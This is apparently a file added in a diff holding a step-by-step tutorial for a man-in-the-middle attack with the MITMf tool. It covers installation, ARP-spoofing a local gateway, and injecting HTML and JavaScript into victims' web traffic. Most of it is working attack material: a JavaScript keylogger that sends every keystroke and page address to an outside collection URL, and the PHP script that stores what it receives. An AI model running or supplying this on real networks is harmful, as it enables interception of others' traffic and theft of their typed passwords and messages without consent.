@@ -1,0 +1,128 @@
+INJECT ARBITRARY CODE DURING MITM ATTACK USING MITMF
+https://github.com/byt3bl33d3r/MITMf/
+
+On Arch Linux
+$ pacman -S python2-setuptools libnetfilter_queue libpcap libjpeg-turbo capstone
+
+On Debian and derivatives such as Ubuntu, Kali Linux etc …
+$ apt install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
+
+Install virtualenvwrapper
+$ pip install virtualenvwrapper
+
+Edit your .bashrc or .zshrc 
+$ source /usr/bin/virtualenvwrapper.sh
+
+Create your virtualenv
+$ mkvirtualenv MITMf -p /usr/bin/python2.7
+
+Clone the MITMf repository
+$ mkdir -p /opt/sniffing-spoofing/
+$ cd /opt/sniffing-spoofing/
+$ git clone https://github.com/byt3bl33d3r/MITMf
+$ cd MITMf && git submodule init && git submodule update --recursive
+$ pip install -r requirements.txt
+$ chmod +x mitmf.py
+
+Find my interface name
+$ ifconfig
+
+Find my router gateway
+$ ip route
+
+Inject HTML Code
+$ cd ~/
+$ mkdir demo && cd demo
+$ echo '<div>HTML code to inject</div>' > ~/demo/inject.html
+$ mitmf --inject --html-file ~/demo/inject.html --spoof --arp --gateway 192.168.1.1 -i wlp2s0
+
+Inject JS Code
+$ cd ~/
+$ mkdir demo && cd demo
+$ echo '<script type="text/javascript">alert("JS code to inject");</script>' > ~/demo/inject.js
+$ mitmf --inject --js-file ~/demo/inject.js --spoof --arp --gateway 192.168.1.1 -i wlp2s0
+
+DEPLOY THE ATTACK
+Create JS Keylogger file – keylogger.js
+
+if((window.jQuery))
+{
+    console.log("jQuery Found");
+}
+else
+{
+    console.log("jQuery Not Found");
+    var script = document.createElement('script');
+    script.src = 'https://code.jquery.com/jquery-3.3.1.min.js';
+    document.body.appendChild(script);
+}
+ 
+function c(d)
+{
+    jQuery.ajax(
+    {
+        dataType: "jsonp",
+        type:"GET",
+        url: "https://example.com/keylogger.php", // Your Keylogger URL
+        jsonp:"keypressed",
+        data:
+        {
+            altnKey:d.altKey?1:0,
+            ctrlKey:d.ctrlKey?1:0,
+            userKey:d.key,
+            targKey:d.target.id,
+            userURI:d.target.baseURI
+        },
+        async:false,
+        success: function(data)
+        {
+            console.log(data);
+        },
+        error:function(xhr, ajaxOptions, thrownError)
+        {
+            console.log("Error");
+        }
+    });
+}
+ 
+window.onload = function()
+{
+    window.addEventListener("keydown", function(e)
+    {
+        c(e);
+    });
+}
+
+Create PHP Keylogger file – keylogger.php
+
+header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
+header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
+header('Access-Control-Allow-Credentials: true');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Headers: Content-Type, *');
+ 
+$file = 'data.txt';
+if(!file_exists($file))
+{
+    $fh = fopen($file, 'w');
+}
+ 
+function f($str)
+{
+    return trim(preg_replace("(\\\)","",htmlentities(strip_tags($str),ENT_QUOTES,'UTF-8')));
+}
+ 
+$altnKey=(int)$_GET['altnKey'];
+$ctrlKey=(int)$_GET['ctrlKey'];
+$userKey=f($_GET['userKey']);
+$targKey=f($_GET['targKey']);
+$userURI=f($_GET['URI']);
+ 
+$string = $altnKey."|".$ctrlKey."|".$userKey."|".$targKey."|".$userURI."\n";
+ 
+file_put_contents($file, $string, FILE_APPEND);
+
+Inject the JS file
+$ mitmf --inject --js-file ~/demo/keylogger.js --spoof --arp --gateway 192.168.1.1 -i wlp2s0
+
+https://www.youtube.com/watch?v=q8hQftJoMQ4
